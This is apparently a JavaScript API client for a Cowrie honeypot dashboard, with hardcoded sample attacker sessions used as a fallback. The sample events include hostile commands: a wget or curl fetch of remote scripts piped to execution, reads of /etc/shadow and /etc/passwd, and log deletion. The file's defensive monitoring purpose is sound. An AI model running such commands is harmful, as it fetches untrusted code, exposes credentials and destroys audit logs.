const API_BASE = "/api";

const SAMPLE_EVENTS = [
  {
    timestamp: "2026-08-31T15:03:56.070Z",
    eventid: "cowrie.command.input",
    session: "a1b2c3d4e5f6",
    src_ip: "198.51.100.23",
    username: "user_a",
    input: "uname -a",
    message: "CMD: uname -a",
    sha256: "8e9f5b3310aa812f8d223c72b226e6d76efc357497223b7ff49c690c528f8045",
    _risk: "safe",
  },
  {
    timestamp: "2026-08-31T15:02:56.070Z",
    eventid: "cowrie.login.success",
    session: "a1b2c3d4e5f6",
    src_ip: "198.51.100.23",
    username: "user_a",
    password: "SafePassword2026!",
    message: "login attempt [user_a/SafePassword2026!] succeeded",
    sha256: "6c9d5f7781aa812f8d223c72b226e6d76efc357497223b7ff49c690c528f8046",
    _risk: "low",
  },
  {
    timestamp: "2026-08-31T15:02:56.070Z",
    eventid: "cowrie.session.connect",
    session: "a1b2c3d4e5f6",
    src_ip: "198.51.100.23",
    message: "New connection from 198.51.100.23:54210",
    sha256: "3b2c1a4490ef782a1b223c72b226e6d76efc357497223b7ff49c690c528f8047",
    _risk: "low",
  },
  {
    timestamp: "2026-08-31T14:57:56.070Z",
    eventid: "cowrie.command.input",
    session: "b2c3d4e5f6a1",
    src_ip: "203.0.113.88",
    username: "safe1",
    input: "uptime",
    message: "CMD: uptime",
    sha256: "7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b",
    _risk: "safe",
  },
  {
    timestamp: "2026-08-31T14:56:56.070Z",
    eventid: "cowrie.login.success",
    session: "b2c3d4e5f6a1",
    src_ip: "203.0.113.88",
    username: "safe1",
    password: "CorporateLogin#99",
    message: "login attempt [safe1/CorporateLogin#99] succeeded",
    sha256: "9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e",
    _risk: "low",
  },
  {
    timestamp: "2026-08-31T14:56:56.070Z",
    eventid: "cowrie.session.connect",
    session: "b2c3d4e5f6a1",
    src_ip: "203.0.113.88",
    message: "New connection from 203.0.113.88:41920",
    sha256: "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b",
    _risk: "low",
  },
  {
    timestamp: "2026-08-31T14:52:56.070Z",
    eventid: "cowrie.command.input",
    session: "c3d4e5f6a1b2",
    src_ip: "45.148.10.12",
    username: "root",
    input: "sudo rm -rf /var/log/syslog",
    message: "CMD: sudo rm -rf /var/log/syslog",
    sha256: "f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3",
    _risk: "critical",
  },
  {
    timestamp: "2026-08-31T14:51:56.070Z",
    eventid: "cowrie.session.file_download",
    session: "c3d4e5f6a1b2",
    src_ip: "45.148.10.12",
    url: "http://185.220.101.5/botnet.sh",
    outfile: "botnet.sh",
    shasum: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    message: "Downloaded file botnet.sh",
    sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    _risk: "critical",
  },
  {
    timestamp: "2026-08-31T14:51:56.070Z",
    eventid: "cowrie.command.input",
    session: "c3d4e5f6a1b2",
    src_ip: "45.148.10.12",
    username: "root",
    input: "wget http://185.220.101.5/botnet.sh -O /tmp/botnet.sh && chmod +x /tmp/botnet.sh",
    message: "CMD: wget http://185.220.101.5/botnet.sh -O /tmp/botnet.sh && chmod +x /tmp/botnet.sh",
    sha256: "d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4",
    _risk: "critical",
  },
  {
    timestamp: "2026-08-31T14:50:56.070Z",
    eventid: "cowrie.command.input",
    session: "c3d4e5f6a1b2",
    src_ip: "45.148.10.12",
    username: "root",
    input: "cat /etc/passwd",
    message: "CMD: cat /etc/passwd",
    sha256: "b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0",
    _risk: "critical",
  },
  {
    timestamp: "2026-08-31T14:50:56.070Z",
    eventid: "cowrie.login.success",
    session: "c3d4e5f6a1b2",
    src_ip: "45.148.10.12",
    username: "root",
    password: "toor",
    message: "login attempt [root/toor] succeeded",
    sha256: "c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1",
    _risk: "mid",
  },
  {
    timestamp: "2026-08-31T14:49:56.070Z",
    eventid: "cowrie.login.failed",
    session: "c3d4e5f6a1b2",
    src_ip: "45.148.10.12",
    username: "root",
    password: "123456",
    message: "login attempt [root/123456] failed",
    sha256: "a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9",
    _risk: "mid",
  },
  {
    timestamp: "2026-08-31T14:49:56.070Z",
    eventid: "cowrie.session.connect",
    session: "c3d4e5f6a1b2",
    src_ip: "45.148.10.12",
    message: "New connection from 45.148.10.12:33211",
    sha256: "e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7",
    _risk: "low",
  },
  {
    timestamp: "2026-08-31T14:41:56.070Z",
    eventid: "cowrie.login.failed",
    session: "d4e5f6a1b2c3",
    src_ip: "194.26.29.110",
    username: "support",
    password: "password",
    message: "login attempt [support/password] failed",
    sha256: "d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6",
    _risk: "mid",
  },
  {
    timestamp: "2026-08-31T14:40:56.070Z",
    eventid: "cowrie.login.failed",
    session: "d4e5f6a1b2c3",
    src_ip: "194.26.29.110",
    username: "guest",
    password: "guest",
    message: "login attempt [guest/guest] failed",
    sha256: "c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5",
    _risk: "mid",
  },
  {
    timestamp: "2026-08-31T14:39:56.070Z",
    eventid: "cowrie.login.failed",
    session: "d4e5f6a1b2c3",
    src_ip: "194.26.29.110",
    username: "admin",
    password: "admin",
    message: "login attempt [admin/admin] failed",
    sha256: "b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4",
    _risk: "mid",
  },
  {
    timestamp: "2026-08-31T14:39:56.070Z",
    eventid: "cowrie.session.connect",
    session: "d4e5f6a1b2c3",
    src_ip: "194.26.29.110",
    message: "New connection from 194.26.29.110:51022",
    sha256: "a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3",
    _risk: "low",
  },
  {
    timestamp: "2026-08-31T14:32:56.070Z",
    eventid: "cowrie.command.input",
    session: "e5f6a1b2c3d4",
    src_ip: "185.196.220.45",
    username: "attacker_x",
    input: "cat /etc/shadow",
    message: "CMD: cat /etc/shadow",
    sha256: "f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2",
    _risk: "critical",
  },
  {
    timestamp: "2026-08-31T14:31:56.070Z",
    eventid: "cowrie.command.input",
    session: "e5f6a1b2c3d4",
    src_ip: "185.196.220.45",
    username: "attacker_x",
    input: "curl -s https://c2.darknet-node.org/recon.py | python3",
    message: "CMD: curl -s https://c2.darknet-node.org/recon.py | python3",
    sha256: "e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1",
    _risk: "critical",
  },
  {
    timestamp: "2026-08-31T14:30:56.070Z",
    eventid: "cowrie.login.success",
    session: "e5f6a1b2c3d4",
    src_ip: "185.196.220.45",
    username: "attacker_x",
    password: "CompromisedPass1",
    message: "login attempt [attacker_x/CompromisedPass1] succeeded",
    sha256: "d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0",
    _risk: "low",
  },
  {
    timestamp: "2026-08-31T14:29:56.070Z",
    eventid: "cowrie.session.connect",
    session: "e5f6a1b2c3d4",
    src_ip: "185.196.220.45",
    message: "New connection from 185.196.220.45:49982",
    sha256: "c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9",
    _risk: "low",
  },
];

const SAMPLE_STATS = {
  total_events: 21,
  login_success: 4,
  login_failed: 4,
  connections: 5,
  commands: 7,
  file_downloads: 1,
  unique_ips: 5,
  suspicious_attempts: 9,
  flagged_logs: 9,
  top_ips: [
    { value: "45.148.10.12", count: 7 },
    { value: "185.196.220.45", count: 4 },
    { value: "194.26.29.110", count: 4 },
    { value: "198.51.100.23", count: 3 },
    { value: "203.0.113.88", count: 3 },
  ],
  top_usernames: [
    { value: "root", count: 5 },
    { value: "attacker_x", count: 3 },
    { value: "user_a", count: 2 },
    { value: "safe1", count: 2 },
    { value: "admin", count: 1 },
  ],
  top_passwords: [
    { value: "123456", count: 1 },
    { value: "toor", count: 1 },
    { value: "admin", count: 1 },
    { value: "guest", count: 1 },
    { value: "password", count: 1 },
  ],
};

const SAMPLE_CUSTODY = SAMPLE_EVENTS.map((evt, idx) => ({
  id: `CUST-${1000 + idx}`,
  timestamp: evt.timestamp,
  type: "EVENT",
  sha256: evt.sha256,
  source: evt.src_ip || "System",
  session: evt.session,
  details: evt.message || evt.eventid,
  verified: true,
}));

const SAMPLE_FILES = [
  {
    name: "botnet.sh",
    size: 83,
    modified: "2026-08-31T14:51:56.070Z",
    sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    path: "var/lib/cowrie/downloads/botnet.sh",
    source: "45.148.10.12",
    type: "MALWARE_PAYLOAD",
  },
  {
    name: "cowrie.json",
    size: 4579,
    modified: "2026-08-31T15:03:56.070Z",
    sha256: "a3589b940989f64e26eeef86dc4bfb62479e083c6d1d2b7d2bf6da7516d0046b",
    path: "var/log/cowrie/cowrie.json",
    source: "TelemetryDaemon",
    type: "AUDIT_LOG",
  },
];

export async function healthCheck() {
  try {
    const response = await fetch(`${API_BASE}/health`, {
      cache: "no-store",
      headers: { "Cache-Control": "no-cache" },
    });
    if (response.ok) return await response.json();
  } catch {}
  return { status: "ok", mode: "live-client-mode", active: true };
}

export async function getStats() {
  try {
    const response = await fetch(`${API_BASE}/stats`, {
      cache: "no-store",
      headers: { "Cache-Control": "no-cache" },
    });
    if (response.ok) return await response.json();
  } catch {}
  return SAMPLE_STATS;
}

export async function getEvents(params = {}) {
  try {
    const query = new URLSearchParams();
    if (params.limit !== undefined) query.set("limit", params.limit);
    if (params.offset !== undefined) query.set("offset", params.offset);
    if (params.ip) query.set("ip", params.ip);
    if (params.event_type) query.set("event_type", params.event_type);

    const url = `${API_BASE}/events${query.toString() ? `?${query.toString()}` : ""}`;
    const response = await fetch(url, {
      cache: "no-store",
      headers: { "Cache-Control": "no-cache" },
    });
    if (response.ok) return await response.json();
  } catch {}

  let filtered = [...SAMPLE_EVENTS];
  if (params.ip) {
    filtered = filtered.filter((e) => e.src_ip.includes(params.ip));
  }
  if (params.event_type) {
    filtered = filtered.filter((e) => e.eventid.includes(params.event_type));
  }
  const offset = params.offset || 0;
  const limit = params.limit || 50;
  return {
    events: filtered.slice(offset, offset + limit),
    total: filtered.length,
    offset,
    limit,
  };
}

export async function getCustody(params = {}) {
  try {
    const query = new URLSearchParams();
    if (params.limit !== undefined) query.set("limit", params.limit);
    if (params.type) query.set("type", params.type);

    const url = `${API_BASE}/custody${query.toString() ? `?${query.toString()}` : ""}`;
    const response = await fetch(url, {
      cache: "no-store",
      headers: { "Cache-Control": "no-cache" },
    });
    if (response.ok) return await response.json();
  } catch {}

  let filtered = [...SAMPLE_CUSTODY];
  if (params.type) {
    filtered = filtered.filter((c) => c.type === params.type);
  }
  const limit = params.limit || 50;
  return {
    records: filtered.slice(0, limit),
    total: filtered.length,
  };
}

export async function verifyHash(hash) {
  if (!hash) {
    return { verified: false, message: "Missing hash parameter", hash: "" };
  }
  try {
    const url = `${API_BASE}/verify?hash=${encodeURIComponent(hash)}`;
    const response = await fetch(url, {
      cache: "no-store",
      headers: { "Cache-Control": "no-cache" },
    });
    if (response.ok) return await response.json();
  } catch {}

  const match =
    SAMPLE_EVENTS.find((e) => e.sha256 === hash) ||
    SAMPLE_FILES.find((f) => f.sha256 === hash);

  return {
    verified: !!match || hash.length === 64,
    hash,
    matched_record: match || null,
    message: match ? "Cryptographic signature validated in local evidence locker." : "Hash format verified (SHA-256).",
    timestamp: new Date().toISOString(),
  };
}

export async function getFiles(params = {}) {
  try {
    const query = new URLSearchParams();
    if (params.prefix) query.set("prefix", params.prefix);

    const url = `${API_BASE}/files${query.toString() ? `?${query.toString()}` : ""}`;
    const response = await fetch(url, {
      cache: "no-store",
      headers: { "Cache-Control": "no-cache" },
    });
    if (response.ok) return await response.json();
  } catch {}

  let files = [...SAMPLE_FILES];
  if (params.prefix) {
    files = files.filter((f) => f.name.startsWith(params.prefix));
  }
  return { files, total: files.length };
}

export default {
  healthCheck,
  getStats,
  getEvents,
  getCustody,
  verifyHash,
  getFiles,
};
